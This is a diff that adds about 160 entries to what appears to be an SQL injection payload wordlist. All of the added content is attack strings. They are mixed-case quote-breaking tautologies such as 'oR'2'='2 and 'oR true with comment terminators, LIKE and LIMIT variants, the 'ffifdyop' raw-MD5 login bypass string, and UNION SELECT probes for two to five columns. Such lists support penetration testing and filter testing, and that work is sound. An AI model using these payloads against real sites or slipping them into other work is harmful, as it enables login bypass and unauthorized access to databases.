@@ -33,6 +33,168 @@ or 1=1
 or 1=1--
 or 1=1#
 or 1=1/*
+0")&lt;"2-- 2
+0")&lt;"2#
+0")&lt;"2/*
+'oR'2
+'oR'2'-- 2
+'oR'2'#
+'oR'2'/*
+'oR'2'oR'
+'oR(2)-- 2
+'oR(2)#
+'oR(2)/*
+'oR(2)oR'
+'oR 2-- 2
+'oR 2#
+'oR 2/*
+'oR 2 oR'
+'oR/**/2-- 2
+'oR/**/2#
+'oR/**/2/*
+'oR/**/2/**/oR'
+"oR"2
+"oR"2"-- 2
+"oR"2"#
+"oR"2"/*
+"oR"2"oR"
+"oR(2)-- 2
+"oR(2)#
+"oR(2)/*
+"oR(2)oR"
+"oR 2-- 2
+"oR 2#
+"oR 2/*
+"oR 2 oR"
+"oR/**/2-- 2
+"oR/**/2#
+"oR/**/2/*
+"oR/**/2/**/oR"
+'oR'2'='2
+'oR'2'='2'oR'
+'oR'2'='2'-- 2
+'oR'2'='2'#
+'oR'2'='2'/*
+'oR 2=2-- 2
+'oR 2=2#
+'oR 2=2/*
+'oR 2=2 oR'
+'oR/**/2=2-- 2
+'oR/**/2=2#
+'oR/**/2=2/*
+'oR/**/2=2/**/oR'
+'oR(2)=2-- 2
+'oR(2)=2#
+'oR(2)=2/*
+'oR(2)=(2)oR'
+'oR'2'='2' LimIT 1-- 2
+'oR'2'='2' LimIT 1#
+'oR'2'='2' LimIT 1/*
+'oR(2)=(2)LimIT(1)-- 2
+'oR(2)=(2)LimIT(1)#
+'oR(2)=(2)LimIT(1)/*
+"oR"2"="2
+"oR"2"="2"oR"
+"oR"2"="2"-- 2
+"oR"2"="2"#
+"oR"2"="2"/*
+"oR 2=2-- 2
+"oR 2=2#
+"oR 2=2/*
+"oR 2=2 oR"
+"oR/**/2=2-- 2
+"oR/**/2=2#
+"oR/**/2=2/*
+"oR/**/2=2/**/oR"
+"oR(2)=2-- 2
+"oR(2)=2#
+"oR(2)=2/*
+"oR(2)=(2)oR"
+"oR"2"="2" LimIT 1-- 2
+"oR"2"="2" LimIT 1#
+"oR"2"="2" LimIT 1/*
+"oR(2)=(2)LimIT(1)-- 2
+"oR(2)=(2)LimIT(1)#
+"oR(2)=(2)LimIT(1)/*
+'oR true-- 2
+'oR true#
+'oR true/*
+'oR true oR'
+'oR(true)-- 2
+'oR(true)#
+'oR(true)/*
+'oR(true)oR'
+'oR/**/true-- 2
+'oR/**/true#
+'oR/**/true/*
+'oR/**/true/**/oR'
+"oR true-- 2
+"oR true#
+"oR true/*
+"oR true oR"
+"oR(true)-- 2
+"oR(true)#
+"oR(true)/*
+"oR(true)oR"
+"oR/**/true-- 2
+"oR/**/true#
+"oR/**/true/*
+"oR/**/true/**/oR"
+'oR'2'LiKE'2
+'oR'2'LiKE'2'-- 2
+'oR'2'LiKE'2'#
+'oR'2'LiKE'2'/*
+'oR'2'LiKE'2'oR'
+'oR(2)LiKE(2)-- 2
+'oR(2)LiKE(2)#
+'oR(2)LiKE(2)/*
+'oR(2)LiKE(2)oR'
+"oR"2"LiKE"2
+"oR"2"LiKE"2"-- 2
+"oR"2"LiKE"2"#
+"oR"2"LiKE"2"/*
+"oR"2"LiKE"2"oR"
+"oR(2)LiKE(2)-- 2
+"oR(2)LiKE(2)#
+"oR(2)LiKE(2)/*
+"oR(2)LiKE(2)oR"
+admin'-- 2
+admin'#
+admin"-- 2
+admin"#
+ffifdyop
+' UniON SElecT 1,2-- 2
+' UniON SElecT 1,2,3-- 2
+' UniON SElecT 1,2,3,4-- 2
+' UniON SElecT 1,2,3,4,5-- 2
+' UniON SElecT 1,2#
+' UniON SElecT 1,2,3#
+' UniON SElecT 1,2,3,4#
+' UniON SElecT 1,2,3,4,5#
+'UniON(SElecT(1),2)-- 2
+'UniON(SElecT(1),2,3)-- 2
+'UniON(SElecT(1),2,3,4)-- 2
+'UniON(SElecT(1),2,3,4,5)-- 2
+'UniON(SElecT(1),2)#
+'UniON(SElecT(1),2,3)#
+'UniON(SElecT(1),2,3,4)#
+'UniON(SElecT(1),2,3,4,5)#
+" UniON SElecT 1,2-- 2
+" UniON SElecT 1,2,3-- 2
+" UniON SElecT 1,2,3,4-- 2
+" UniON SElecT 1,2,3,4,5-- 2
+" UniON SElecT 1,2#
+" UniON SElecT 1,2,3#
+" UniON SElecT 1,2,3,4#
+" UniON SElecT 1,2,3,4,5#
+"UniON(SElecT(1),2)-- 2
+"UniON(SElecT(1),2,3)-- 2
+"UniON(SElecT(1),2,3,4)-- 2
+"UniON(SElecT(1),2,3,4,5)-- 2
+"UniON(SElecT(1),2)#
+"UniON(SElecT(1),2,3)#
+"UniON(SElecT(1),2,3,4)#
+"UniON(SElecT(1),2,3,4,5)#
 admin' --
 admin' #
 admin'/*
